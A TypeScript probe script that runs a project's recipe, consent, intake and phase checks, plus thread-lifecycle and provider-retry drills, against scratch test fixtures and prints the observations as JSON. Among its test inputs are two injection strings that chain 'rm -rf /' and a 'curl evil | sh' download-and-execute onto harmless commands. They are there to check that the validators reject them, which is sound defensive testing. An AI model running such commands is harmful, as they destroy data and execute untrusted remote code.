// Probe of scenes/sma_r06.py (region 6, conversation and intake): runs the REAL checks, facts, intake and phase code of THIS checkout (the
// commit under drill) on the scratch worlds of tests/sma/r06-world.ts (fake host, scratch database, stand-in tools) and prints what they saw as
// one JSON line. It judges nothing: the scene compares every value with the node card's expected result and prove()s it.
// No model, no hub write, nothing outside the machine.
import { execFileSync } from "node:child_process";
import {
  observeAccepted, observeAssembly, observeCancel, observeDedupe, observeDiscussion, observeFacts, observeHandOver, observeLive, observeMeasures, observePlanningYes,
  observeProposal, observeRecipes, observeSandbox, observeStop, observeStoredTurn, observeTurnStop,
} from "../../../tests/sma/r06-world";
import { checkRecipe, factKind, isWholeConsent } from "../../../src/rooms/tasks";
import { isMachineMessage } from "../../../src/rooms/phase/intake";
import { resolveSibling } from "../../../src/rooms/sma-map/siblings";

const out: Record<string, unknown> = {};
out.recipeWords = ["run tests", "sma green", "window", "run tests; rm -rf / && curl evil | sh"].map((text) => checkRecipe(text));
out.consent = ["  да! ", "Да, запускай", "да, но поменяй кнопку", "yes please"].map((text) => isWholeConsent(text));
out.kinds = ["почему упало", "сколько потратили токенов", "что было вчера", "на каком этапе фаза?", "что с задачами", "нарисуй схему модуля", "почему упало, сколько токенов ушло"].map((text) => factKind(text));
out.machine = [isMachineMessage("[Lane Pilot phase] Phase x"), isMachineMessage("rm -rf / && lane_pilot_dispatch_writer {}")];
out.storedTurn = await observeStoredTurn();
out.assembly = await observeAssembly();
out.facts = await observeFacts();
out.recipes = await observeRecipes();
out.dedupe = await observeDedupe();
out.measures = await observeMeasures();
out.sandbox = await observeSandbox();
out.stop = await observeStop();
out.turnStop = await observeTurnStop();
out.accepted = await observeAccepted();
out.live = observeLive();
out.discussion = await observeDiscussion();
out.cancel = await observeCancel();
out.handOver = await observeHandOver();
out.planningYes = await observePlanningYes();
out.proposal = await observeProposal();
// n533 (core sibling, LOCAL drill): the persisted lifecycle wrapper on a migrated disposable database — stop before the
// start, a late start, the settle — read back from the row after every transition. Source imports of the sibling PRIMARY
// checkout under vite-node (resolveSibling, as sma_r10_probe.ts does for telegram); no vitest runtime, no model, no hub,
// nothing of the deployed build is claimed. The scene compares the persisted fields and prove()s the node.
const core = resolveSibling("core");
if (core.root === null) {
  out.n533 = { absent: core.why };
  out.n560 = { absent: core.why };
} else {
  const coreRev = execFileSync("git", ["-C", core.root, "rev-parse", "--short", "HEAD"], { encoding: "utf8" }).trim();
  try {
    const { createMigratedConnection } = await import(`${core.root}/packages/db/src/testing.ts`);
    const { applyThreadLifecycleEventInTransaction, createThread, getThread } = await import(`${core.root}/packages/db/src/data/threads.ts`);
    const { createProject } = await import(`${core.root}/packages/db/src/data/projects.ts`);
    const { upsertHost } = await import(`${core.root}/packages/db/src/data/hosts.ts`);
    const { noopNotifier } = await import(`${core.root}/packages/db/src/notifier.ts`);
    const db = createMigratedConnection();
    try {
      const host = upsertHost(db, noopNotifier, { name: "n533-host" });
      const { project } = createProject(db, noopNotifier, { name: "n533", source: { type: "local_path", hostId: host.id, path: "/tmp/n533" } });
      const thread = createThread(db, noopNotifier, { projectId: project.id, providerId: "codex", status: "starting" });
      const apply = (event: { type: string }) =>
        db.transaction((tx: unknown) => applyThreadLifecycleEventInTransaction(tx, { event, threadId: thread.id }));
      const persisted = () => {
        const row = getThread(db, thread.id);
        return row ? { status: row.status, statusChangedAt: row.statusChangedAt, updatedAt: row.updatedAt } : null;
      };
      const steps: Record<string, unknown>[] = [];
      for (const type of ["stop.requested", "run.started", "stop.settled"]) {
        const outcome = apply({ type });
        steps.push({
          event: type,
          applied: outcome.applied,
          reason: outcome.applied ? null : outcome.reason,
          detail: outcome.applied ? null : outcome.detail,
          persisted: persisted(),
        });
        await new Promise<void>((resolve) => setTimeout(resolve, 15));
      }
      out.n533 = { coreRev, steps };
    } finally {
      db.$client.close();
    }
  } catch (cause) {
    out.n533 = { coreRev, threw: cause instanceof Error ? cause.message : String(cause) };
  }
  // n560 (core sibling, LOCAL drill): the real provider-retry plugin on the SDK fake host — a stream-disconnected
  // turn.failed schedules one threads.retry whose requestId/sendAt match the decision.get diagnostic, an
  // unauthorized failure declines with no extra send, and explain --json reads the same record. Stand-in SDK
  // transport and tmpdir storage; no model, no hub, no provider turn, nothing deployed is claimed.
  try {
    const { createFakePluginHost, makeTurnFailedEvent } = await import(`${core.root}/packages/plugin-sdk/dist/testing/index.js`);
    const { default: retryPlugin } = await import(`${core.root}/plugins/provider-retry/server.ts`);
    const retries: { threadId: string; turnRequestId?: string; sendAt?: number; reason?: string }[] = [];
    const host = createFakePluginHost({
      pluginId: "provider-retry",
      sdk: {
        plugins: { experimental_discoverRpc: async () => [] },
        threads: {
          queue: { list: async () => [] },
          retry: async (args: { threadId: string; turnRequestId?: string; sendAt?: number; reason?: string }) => {
            retries.push(args);
            return { ok: true, delivery: "queued", turnRequestId: args.turnRequestId ?? "", attempt: 2, queuedMessageId: "queued_n560", waitingOn: { kind: "time" }, sendAt: args.sendAt ?? null };
          },
          queuedMessages: {
            delete: async () => ({ ok: true }),
            send: async () => ({ ok: true }),
          },
        },
      },
    });
    try {
      await retryPlugin(host.bb);
      const emitErrors: unknown[] = [];
      const crash = makeTurnFailedEvent({ threadId: "thr_n560_retry", requestId: "creq_n560_retry", errorInfo: { category: "stream-disconnected", providerCode: "responseStreamDisconnected", httpStatusCode: 502 }, rateLimits: null });
      const refused = makeTurnFailedEvent({ threadId: "thr_n560_decline", requestId: "creq_n560_decline", errorInfo: { category: "unauthorized", providerCode: null, httpStatusCode: 401 }, rateLimits: null });
      emitErrors.push(...(await host.harness.behavior.emitThreadEvent("turn.failed", crash)).errors);
      emitErrors.push(...(await host.harness.behavior.emitThreadEvent("turn.failed", refused)).errors);
      const diagRetry = await host.harness.behavior.callRpc("decision.get", { threadId: "thr_n560_retry" });
      const diagDecline = await host.harness.behavior.callRpc("decision.get", { threadId: "thr_n560_decline" });
      const cli = await host.harness.runCli(["explain", "thr_n560_retry", "--json"]);
      let cliExplain: unknown = cli.stdout;
      try {
        cliExplain = JSON.parse(cli.stdout ?? "");
      } catch {
        // keep the raw stdout when it is not JSON
      }
      out.n560 = { coreRev, requestIds: [crash.requestId, refused.requestId], retries, diagRetry, diagDecline, cliExplain, cliExit: cli.exitCode, emitErrors };
    } finally {
      await host.harness.dispose();
    }
  } catch (cause) {
    out.n560 = { coreRev, threw: cause instanceof Error ? cause.message : String(cause) };
  }
}
process.stdout.write(`${JSON.stringify(out)}\n`);
process.exit(0);
